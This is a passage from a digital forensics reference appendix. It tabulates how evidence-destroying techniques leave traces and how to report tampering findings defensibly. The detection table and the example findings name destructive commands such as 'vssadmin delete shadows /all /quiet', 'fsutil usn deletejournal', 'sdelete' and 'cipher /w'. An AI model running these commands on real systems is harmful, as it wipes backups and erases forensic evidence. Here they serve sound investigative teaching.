| **`vssadmin delete shadows /all`** | Recovery + historical state | Process execution evidence | 4688 / Sysmon EID 1; Prefetch `VSSADMIN.EXE-*.pf`; `volsnap` EID **25** | High |
| **`vssadmin resize shadowstorage`** | Snapshots, indirectly | Same execution evidence; deletions look routine | 4688 command line; `volsnap` EID 25 clustering | Medium |
| **`bcdedit` recovery tampering** | Recovery boot options | BCD store contents; execution evidence | `bcdedit /enum`; 4688 / Sysmon EID 1; `BCDEDIT.EXE-*.pf` | High |
| **Prefetch disabled / purged** | Execution history | Registry key timestamp; `$J` deletion burst | `PrefetchParameters\EnablePrefetcher`; USN Journal | Medium-high |
| **`fsutil usn deletejournal`** | File-system change history | A brand-new journal ID and low USN base | `fsutil usn queryjournal`; `FSUTIL.EXE-*.pf` | High |
| **Amcache deleted / Appraiser disabled** | Program-execution inventory | `Amcache.hve.LOG1/.LOG2`; task-change events | Transaction logs; Security EID **4701**/**4702** | Medium-high |
| **`sdelete` / `cipher /w`** | File content | Tool execution evidence; `EFSTMPWP` directory | `HKCU\Software\Sysinternals\SDelete\EulaAccepted`; Prefetch; SRUM; MFT/USN | High |
| **Full-disk wipe** | Everything on the host | Nothing on the host | Off-host: EDR, SIEM, DC logs, proxy/flow (Ch8, App A, App C) | N/A on host |
| **LOLBin usage** | Nothing — avoids creating artifacts | Command lines, network records, tool-specific caches | 4688 / Sysmon EID 1 + 3; BITS `qmgr.db`; certutil INetCache | Medium (context-dependent) |
| **Attacker tool deleted** | The binary | MFT record, Prefetch, Amcache SHA-1, ShimCache, SRUM | Prefetch + Amcache; unallocated MFT records | High |
| **In-memory-only execution** | All disk artifacts | Process memory, network connections, EDR telemetry | Memory image (`malfind`, `psscan`); EDR backend | Medium-high (if memory captured) |
| **Defender / EDR disabled** | Detection and telemetry | Configuration change events; exclusion paths | Defender EID **5001**/**5007**; `Exclusions\Paths`; EDR-side agent-health gap | High |
| **Registry persistence removed** | The persistence value | Deleted hive cells; parent key LastWriteTime; `.LOG1/.LOG2` | Registry Explorer deleted records; shadow-copy hive comparison | Medium-high |
| **Service deleted (`sc delete`)** | The service definition | Install event; stale alternate control set | System EID **7045**; SYSTEM hive control set diff | Medium-high |
| **Scheduled task deleted** | The task | Creation and deletion events; task XML in MFT | Security EID **4698**/**4699**; TaskScheduler EID **141** | High |

## G.10 Writing About Anti-Forensics Defensibly

Tampering findings are the ones most likely to end up in front of a lawyer, a regulator, an insurer, or opposing counsel, because tampering implies intent and intent implies liability. They are also the findings that reports most commonly overstate. Chapter 13 covers reporting in general. This section covers the specific discipline of writing about destroyed evidence.

### G.10.1 Separate the observation from the inference

The observation is what the artifact says. The inference is what you think it means. Both belong in the report, but in *different sentences*, clearly labelled.

| Overclaiming | Defensible |
|---|---|
| "The attacker covered their tracks." | "The Security event log was cleared at 03:14:22 UTC. EID 1102 records the clearing account as `FINANCE\svc-backup`, logon ID `0x3E7A19`." |
| "Logs were wiped to hide the intrusion." | "The Security log contains no records between 02:41 and 03:14 UTC. Record IDs are contiguous on either side of that window and non-contiguous across it, with 1,847 record IDs unaccounted for." |
| "The file was timestomped." | "`svchost.exe` in `C:\Windows\Temp` carries `$SI` timestamps of 2009-07-14 01:14:24.0000000 and an `$FN` Created timestamp of 2026-03-14 03:11:07. The USN Journal records file creation at 2026-03-14 03:11:07." |
| "Shadow copies were deleted by ransomware." | "`vssadmin.exe delete shadows /all /quiet` executed at 04:02:11 UTC under `FINANCE\jsmith` (EID 4688, PID 6612, parent `cmd.exe` PID 4408). `vssadmin list shadows` at acquisition returned no snapshots." |
| "There is no evidence of exfiltration." | "No file-transfer activity was identified in the available proxy records, which cover 30 days. The host's USN Journal was recreated at 03:47 UTC and does not cover the incident window; file-system change history before that time is not available." |

The last row is the one most often skipped. When a source is missing, **say what is missing and what that means for the confidence of the finding**. A report that silently omits the destroyed journal will not survive review.

### G.10.2 State alternative explanations and why you excluded them

Every technique in this appendix has a legitimate counterpart. Log clearing happens during troubleshooting. `sdelete` is standard in decommissioning workflows. Storage-pressure automation deletes shadow copies. Prefetch is off by default on servers. Ordinary archive extraction, `robocopy /COPY:DAT`, and installer packages that preserve original file times all "stomp" timestamps.

A defensible tampering finding names the benign explanation and disposes of it with evidence:

> The Security log was cleared at 03:14:22 UTC by `FINANCE\svc-backup`. This account is used by the nightly backup job, which runs at 01:00 and does not clear event logs in its documented configuration. No change ticket exists for this host in the window 02:00–06:00 UTC. The same account authenticated interactively (EID 4624, logon type 10) from `10.14.22.87` at 02:39 UTC, which is inconsistent with its normal service-account usage pattern.

That paragraph contains no accusation and is much harder to dismiss than "the attacker cleared the logs."

### G.10.3 Attach confidence, and say what it rests on

Use the confidence language consistently across the report, and tie each level to corroboration count rather than to how strongly you feel:

- **High** — multiple independent artifact sources agree, and benign explanations have been checked and excluded.
- **Medium** — a single reliable source supports it, and corroboration is unavailable rather than contradictory.
- **Low** — the artifact is consistent with the hypothesis but also with ordinary activity.

Where a finding is high-confidence for *the act* but low-confidence for *the actor*, say so explicitly. "The log was cleared using the `svc-backup` credential" is a different claim from "the backup service cleared the log," which is different again from "the person who compromised this host cleared the log." Credential use is not identity.

### G.10.4 Handle the preservation and escalation angle

Suspected tampering changes the character of an engagement:

- **Preserve immediately and stop changing the host.** If evidence is being destroyed, further destruction may be ongoing. Capture memory, then image, then contain. Note the time you formed the suspicion in the case notes.
- **Record it in the chain of custody.** Chapter 1 and Chapter 3 cover the mechanics. A tampering suspicion is a chain-of-custody-relevant event, and it belongs in the log with a timestamp.
- **Escalate the decision, do not make it.** Whether evidence destruction constitutes spoliation, obstruction, or an insider-threat matter is a legal and HR determination. Your job is to document what the artifacts show, in the order you found them, with your methodology stated. Say what you observed, and let counsel characterize it.
- **Preserve the off-host copies before they rotate.** SIEM retention, WEF collectors, EDR backends, proxy logs, and cloud audit logs (Appendix B) are frequently the only surviving record of what the host used to know, and they have retention clocks of their own. Pulling and preserving them is usually more urgent than any further on-host analysis.

The through-line of this appendix, and arguably of the book: state precisely, and with support, what the evidence does and does not show — including where it stops, and why. You are not trying to prove the attacker was clever.

---

*End of Appendix G.*

---
